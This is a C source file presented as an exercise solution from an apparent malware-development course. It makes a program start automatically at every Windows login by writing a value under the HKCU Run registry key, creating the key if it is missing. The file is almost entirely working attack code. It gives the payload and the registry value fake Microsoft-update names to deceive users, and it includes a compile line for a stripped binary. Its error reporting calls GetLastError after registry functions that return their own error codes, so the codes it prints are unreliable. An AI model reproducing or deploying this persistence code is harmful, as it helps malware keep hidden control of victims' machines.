/*
 * exercise 1 solution
 * persistence: HKCU Run key via RegCreateKeyEx + error checking
 * hack1.c
 * author: @cocomelonc
 *
 * base: 01-classic-registry-run-keys/pers.c
 *
 * problem with the original:
 *   RegOpenKeyEx fails silently when the key does not exist, so the
 *   persistence value is never written on stripped/minimal Windows
 *   images where the Run key has been removed.
 *
 * change 1: RegOpenKeyEx -> RegCreateKeyEx
 *   RegCreateKeyEx opens the key if it exists OR creates it if it
 *   doesn't, then returns a handle in either case.
 *
 *   LONG RegCreateKeyEx(
 *     HKEY                  hKey,          root (HKEY_CURRENT_USER)
 *     LPCSTR                lpSubKey,      subkey path
 *     DWORD                 Reserved,      must be 0
 *     LPSTR                 lpClass,       NULL = no class
 *     DWORD                 dwOptions,     REG_OPTION_NON_VOLATILE
 *     REGSAM                samDesired,    KEY_WRITE
 *     LPSECURITY_ATTRIBUTES lpSecAttr,     NULL = inherit
 *     PHKEY                 phkResult,     out: key handle
 *     LPDWORD               lpdwDisposition  out: REG_CREATED_NEW_KEY
 *                                             or REG_OPENED_EXISTING_KEY
 *   );
 *
 * change 2: error checking with GetLastError()
 *   print the Win32 error code if the API calls fail so students can
 *   diagnose permission issues (e.g. running without appropriate user).
 *
 * compile (cross-compile from Linux):
 * x86_64-w64-mingw32-gcc hack1.c -o hack1.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
 */
#include <windows.h>
#include <string.h>
#include <stdio.h>

int main(void) {
  HKEY  hkey = NULL;
  DWORD disposition = 0;

  /* path to the malicious executable */
  const char *exe      = "Z:\\SecurityWindowsUpdate2025_April.exe";
  /* value name that appears in the Run key */
  const char *valname  = "MicrosoftPatchUpdateApril_v13.04.3434343";
  /* registry key path (no leading backslash) */
  const char *keypath  = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

  /*
   * exercise 1 change: RegCreateKeyEx instead of RegOpenKeyEx.
   *
   * original:
   *   RegOpenKeyEx(HKEY_CURRENT_USER, keypath, 0, KEY_WRITE, &hkey);
   *   - fails with ERROR_FILE_NOT_FOUND if the key does not exist
   *
   * updated:
   *   RegCreateKeyEx(...) - creates OR opens; always returns a handle
   *   when successful regardless of whether the key pre-existed.
   */
  LONG res = RegCreateKeyEx(
    HKEY_CURRENT_USER,       /* hive */
    keypath,                 /* subkey path */
    0,                       /* reserved, must be 0 */
    NULL,                    /* class (ignored for most keys) */
    REG_OPTION_NON_VOLATILE, /* persist across reboots */
    KEY_WRITE,               /* we only need write access */
    NULL,                    /* default security */
    &hkey,                   /* OUT: key handle */
    &disposition             /* OUT: created vs opened */
  );

  if (res != ERROR_SUCCESS) {
    printf("[-] RegCreateKeyEx failed: error %ld\n", GetLastError());
    return 1;
  }

  /* report whether the key was newly created or already existed */
  if (disposition == REG_CREATED_NEW_KEY) {
    printf("[+] Run key created (did not exist before)\n");
  } else {
    printf("[+] Run key opened (already existed)\n");
  }

  /* write the persistence value */
  res = RegSetValueEx(hkey, valname, 0, REG_SZ,
                      (const BYTE*)exe, (DWORD)(strlen(exe) + 1));
  if (res != ERROR_SUCCESS) {
    printf("[-] RegSetValueEx failed: error %ld\n", GetLastError());
    RegCloseKey(hkey);
    return 1;
  }

  printf("[+] persistence value written: %s -> %s\n", valname, exe);
  RegCloseKey(hkey);
  return 0;
}
